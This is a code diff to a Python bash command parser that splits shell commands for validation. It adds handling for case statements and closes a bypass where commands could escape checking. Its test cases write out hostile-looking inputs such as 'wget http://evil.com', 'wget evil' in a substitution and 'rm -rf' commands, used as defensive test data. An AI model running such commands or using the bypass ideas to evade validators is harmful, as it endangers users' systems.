@@ -31,6 +31,17 @@ class BashCommandParser:
     # Redirections that don't take an argument
     REDIRECTIONS_NO_ARG = ['2>&1', '1>&2', '<&', '>&']
 
+    # Words after which a NEW command may begin, so a `case` appearing right
+    # after one is the `case` KEYWORD rather than an argument. Used to gate
+    # case-statement recognition: mistaking an argument for the keyword would
+    # make us drop the following tokens as pattern text, which could hide a real
+    # command from validation. Terminators (`done`, `fi`, `esac`) are absent —
+    # a command can only follow them after a separator, which sets the flag
+    # anyway.
+    CMD_POSITION_WORDS = frozenset({
+        'if', 'then', 'elif', 'else', 'while', 'until', 'do', '{', '!', 'time',
+    })
+
     # Redirections that WRITE to their path operand (create/truncate/append, or
     # point stdout/stderr at a file). Pure reads (`<`, `<<`) are excluded: they
     # consume an existing file, they neither create nor overwrite one, so their
@@ -303,6 +314,7 @@ class BashCommandParser:
         - QUOTED: Quoted string
         - HEREDOC_CONTENT: Content inside a heredoc (not parsed as commands)
         - CMD_SUBST: Command substitution $(...) or `...`
+        - CASE_PATTERN: A `case` arm pattern (data, not a command; dropped)
 
         Args:
             command: Command string
@@ -335,13 +347,62 @@ class BashCommandParser:
         # `[[ $(rm -rf /) ]]` still validates `rm -rf /` on its own.
         in_conditional = False
 
+        # Case-statement handling. `case WORD in pat1|pat2) body ;; ... esac`
+        # puts a PATTERN LIST where a command would otherwise be, and inside it
+        # `|` alternates patterns while `)` closes the list — neither is a
+        # command separator. Without this, `case "$f" in *docs*|*tmp*) continue;;`
+        # splits into bogus sub-commands (`*docs*`, `*tmp*) continue`) that match
+        # no allow pattern, forcing a prompt for a harmless script.
+        #
+        # case_stack holds one entry per open `case`, so nesting works. States:
+        #   'case_word' — consumed `case`, awaiting its WORD operand
+        #   'await_in'  — awaiting the `in` that opens the pattern list
+        #   'pattern'   — inside a pattern list (data, not commands)
+        #   'body'      — inside an arm body (normal commands) until `;;`
+        # Pattern words are emitted as CASE_PATTERN and dropped when splitting;
+        # a command substitution inside a pattern is still emitted separately
+        # (bash does expand it) and so is still validated.
+        case_stack = []
+        case_paren_depth = 0  # extglob nesting inside the current pattern list
+
+        # True while the next word would begin a new command. Gates `case`
+        # recognition: without it, an argument that merely spells `case`
+        # (`echo case ... in`) would flip us into pattern mode and DROP the
+        # commands that follow — a bypass, not just a mis-parse.
+        at_cmd_start = True
+
         def flush_current():
             """Flush current token buffer"""
-            nonlocal in_conditional
-            if current:
-                token_str = ''.join(current)
+            nonlocal in_conditional, at_cmd_start
+            if not current:
+                return
+            token_str = ''.join(current)
+            current.clear()
+
+            in_pattern = bool(case_stack) and case_stack[-1] == 'pattern'
+
+            # Advance the case state machine BEFORE emitting, so the `in` that
+            # opens a pattern list and the `esac` that closes the statement are
+            # themselves still emitted as ordinary words.
+            if case_stack and case_stack[-1] == 'case_word':
+                case_stack[-1] = 'await_in'
+            elif case_stack and case_stack[-1] == 'await_in':
+                if token_str == 'in':
+                    case_stack[-1] = 'pattern'
+                else:
+                    # Not the `case WORD in` shape after all — abandon it rather
+                    # than start dropping tokens as patterns.
+                    case_stack.pop()
+            elif token_str == 'esac' and case_stack:
+                case_stack.pop()
+                in_pattern = False
+            elif token_str == 'case' and at_cmd_start and not in_pattern:
+                case_stack.append('case_word')
+
+            if in_pattern:
+                tokens.append(('CASE_PATTERN', token_str, current_start))
+            else:
                 tokens.append(self._classify_token(token_str, current_start))
-                current.clear()
                 # `[[` / `]]` are recognized only as standalone tokens (bash
                 # requires them space-separated), so toggling on the flushed
                 # word is exact — a glued `a[[b` or `${arr[[i]]}` never matches.
@@ -349,6 +410,18 @@ class BashCommandParser:
                     in_conditional = True
                 elif token_str == ']]':
                     in_conditional = False
+
+            # A `KEY=VALUE` env prefix precedes the command it applies to, so it
+            # leaves command position intact; every other word consumes it
+            # unless it is a keyword that introduces a further command.
+            if tokens[-1][0] != 'ENV':
+                at_cmd_start = token_str in self.CMD_POSITION_WORDS
+
+        def emit_separator(value, offset):
+            """Append a command separator, reopening command position."""
+            nonlocal at_cmd_start
+            tokens.append(('OP', value, offset))
+            at_cmd_start = True
 
         while i < len(command):
             # While the buffer is empty, keep the start offset pinned to the
@@ -648,20 +721,79 @@ class BashCommandParser:
                     i = j + len(fd_op)
                     continue
 
+            in_case_pattern = bool(case_stack) and case_stack[-1] == 'pattern'
+
+            # Inside a `case` pattern list, `)` closes the list and hands control
+            # back to normal command parsing. A `(` that STARTS a pattern word is
+            # the optional list-opener bash allows (`(a|b) cmd;;`) and is dropped;
+            # a `(` glued inside a word opens an extglob (`@(a|b)`) whose own `)`
+            # must not be mistaken for the closer, so track its depth.
+            if in_case_pattern and char == '(':
+                if not current and case_paren_depth == 0:
+                    i += 1  # optional `(` before the pattern list
+                    continue
+                case_paren_depth += 1
+                current.append(char)
+                i += 1
+                continue
+            if in_case_pattern and char == ')':
+                if case_paren_depth > 0:
+                    case_paren_depth -= 1
+                    current.append(char)
+                    i += 1
+                    continue
+                flush_current()
+                case_stack[-1] = 'body'
+                case_paren_depth = 0
+                # The arm body is a new command; without a separator here it
+                # would merge into the `case ... in` header token group.
+                emit_separator(';', i)
+                i += 1
+                continue
+
+            # An `esac` glued to an arm terminator (`... ;; esac;; ...`) closes an
+            # INNER case, and the terminator then belongs to the ENCLOSING arm.
+            # Operator detection is suppressed in pattern mode, so without this
+            # the buffer would grow to `esac;;`, the state machine would never
+            # see a bare `esac`, and the inner case would stay open — swallowing
+            # the outer statement's remaining arms as pattern text. Flush it here
+            # so the pop happens, then re-read the `;` in the popped state.
+            if in_case_pattern and char == ';' and ''.join(current) == 'esac':
+                flush_current()
+                continue
+
+            # `;;` ends a case arm and returns to pattern parsing, so the NEXT
+            # arm's pattern list is read as data rather than as commands. The
+            # bash fallthrough forms `;&` and `;;&` terminate an arm too.
+            if case_stack and case_stack[-1] == 'body' and char == ';':
+                term = next((t for t in (';;&', ';;', ';&')
+                             if command[i:i+len(t)] == t), None)
+                if term:
+                    flush_current()
+                    emit_separator(';', i)
+                    case_stack[-1] = 'pattern'
+                    case_paren_depth = 0
+                    i += len(term)
+                    continue
+
             # Check for operators (only when not quoted). Inside a `[[ ]]`
             # conditional, &&/||/|/<>/ are expression operators, not command
             # separators, so they fall through to ordinary word content. The
-            # exception is a closing `]]` glued to this operator (e.g. `]];`,
-            # `]]|`): it hasn't been flushed yet, so in_conditional is still True
-            # — flush it now to end the conditional and let the operator split.
+            # same holds inside a `case` pattern list, where `|` alternates
+            # patterns and `<`/`>` are literal pattern characters. The exception
+            # is a closing `]]` glued to this operator (e.g. `]];`, `]]|`): it
+            # hasn't been flushed yet, so in_conditional is still True — flush it
+            # now to end the conditional and let the operator split.
             op = self._check_operator(command, i)
             if op and in_conditional and ''.join(current) == ']]':
                 flush_current()  # flips in_conditional False
-            if op and not in_conditional:
+            if op and not in_conditional and not in_case_pattern:
                 flush_current()
                 # Classify operator as OP or REDIRECT
-                op_type = 'REDIRECT' if self._is_redirect(op) else 'OP'
-                tokens.append((op_type, op, i))
+                if self._is_redirect(op):
+                    tokens.append(('REDIRECT', op, i))
+                else:
+                    emit_separator(op, i)
                 i += len(op)
                 continue
 
@@ -691,7 +823,7 @@ class BashCommandParser:
                     # An unquoted newline separates commands, just like ';'.
                     # (Quoted, escaped/continuation, heredoc, and command-subst
                     # newlines are handled before reaching this point.)
-                    tokens.append(('OP', ';', i))
+                    emit_separator(';', i)
                 i += 1
                 continue
 
@@ -849,11 +981,11 @@ class BashCommandParser:
         for t_type, t_val, t_off in tokens:
             if pending:
                 pending = False
-                # The path is the immediately following token. An operator here
-                # means the redirect had no path operand (malformed `> ;`) —
-                # operators never name a file, so record nothing and let this
-                # token be re-examined as a possible new redirect below.
-                if t_type != 'OP':
+                # The path is the immediately following token. An operator (or a
+                # case pattern) here means the redirect had no path operand
+                # (malformed `> ;`) — neither names a file, so record nothing and
+                # let this token be re-examined as a possible new redirect below.
+                if t_type not in ('OP', 'CASE_PATTERN'):
                     targets.append((self._strip_quotes(t_val), t_off))
                     continue
             if t_type == 'REDIRECT' and t_val in self.WRITE_REDIRECTIONS_WITH_ARG:
@@ -930,6 +1062,11 @@ class BashCommandParser:
                 # Only skip next token if this redirect takes an argument
                 if token_value in self.REDIRECTIONS_WITH_ARG:
                     skip_next = True
+            elif token_type == 'CASE_PATTERN':
+                # A `case` arm pattern is data matched against a word, not a
+                # command — drop it. Any command substitution inside it was
+                # emitted as its own CMD_SUBST token and is still validated.
+                continue
             else:
                 # Regular token or ENV var
                 current_group.append((token_type, token_value, token_offset))
@@ -1001,8 +1138,10 @@ class BashCommandParser:
           be left intact. So we strip braces only when they are whole tokens.
 
         Parens remain imperfect for glued non-grouping uses (arithmetic
-        "$((1+2))", extglob "@(a|b)", case patterns "foo)"); fully resolving
-        those needs paren-depth tracking in the tokenizer, not string stripping.
+        "$((1+2))", extglob "@(a|b)"); fully resolving those needs paren-depth
+        tracking in the tokenizer, not string stripping. Case-arm patterns are
+        no longer among them — the tokenizer recognizes `case ... in` and emits
+        the pattern list as CASE_PATTERN tokens, which never reach this point.
         """
         if not command:
             return command
@@ -1193,6 +1332,40 @@ if __name__ == '__main__':
         # digit glued to a word stays part of that word (bash semantics).
         ('echo 3 > out.txt', ["echo 3"]),
         ('echo foo3>out.txt', ["echo foo3"]),
+        # `case` pattern lists are data: `|` alternates patterns (not a pipe)
+        # and `)` closes the list, so the patterns are dropped and only the arm
+        # bodies survive as commands. The real-world failing case was a
+        # `while read` filter loop whose multi-pattern arm split into bogus
+        # sub-commands (`*docs*`, `*example*) continue`) and forced a prompt.
+        ('case "$x" in a|b) echo hi;; *) echo bye;; esac',
+         ['case "$x" in', "echo hi", "echo bye", "esac"]),
+        ('case "$f" in *docs*|*/tasks/*|*example*) continue;; esac',
+         ['case "$f" in', "continue", "esac"]),
+        # The optional `(` opening a pattern list is dropped; an extglob's own
+        # parens are balanced inside the pattern and do not close the list.
+        ('case "$x" in (a|b) echo hi;; @(c|d)) echo yo;; esac',
+         ['case "$x" in', "echo hi", "echo yo", "esac"]),
+        # bash fallthrough terminators `;&` and `;;&` end an arm too.
+        ('case $x in a) echo one;& b) echo two;;& *) echo three;; esac',
+         ["case $x in", "echo one", "echo two", "echo three", "esac"]),
+        # Nested case, including an inner `esac` glued to the outer arm's `;;`.
+        ('case $a in x) case $b in y|z) echo deep;; esac;; *) echo out;; esac',
+         ["case $a in", "case $b in", "echo deep", "esac", "echo out", "esac"]),
+        # An arm body still splits normally on real operators.
+        ('case $x in *) git status | head -5;; esac',
+         ["case $x in", "git status", "head -5", "esac"]),
+        # A command substitution in a pattern IS expanded by bash, so it is
+        # still extracted and validated even though the pattern text is dropped.
+        ('case $x in $(wget evil)) echo hi;; esac',
+         ["case $x in", "echo hi", "esac", "wget evil"]),
+        # `case` is only the keyword in command position. As a mere argument it
+        # must NOT start pattern mode, or the commands after a later `in` would
+        # be silently dropped instead of validated.
+        ('echo case; for f in *; do rm -rf /tmp/x; done',
+         ["echo case", "for f in *", "do rm -rf /tmp/x", "done"]),
+        # A command after the closing `esac` is still validated.
+        ('case $x in a) echo hi;; esac; wget http://evil.com',
+         ["case $x in", "echo hi", "esac", "wget http://evil.com"]),
     ]
 
     print("=== Bash Command Parser Tests ===\n")
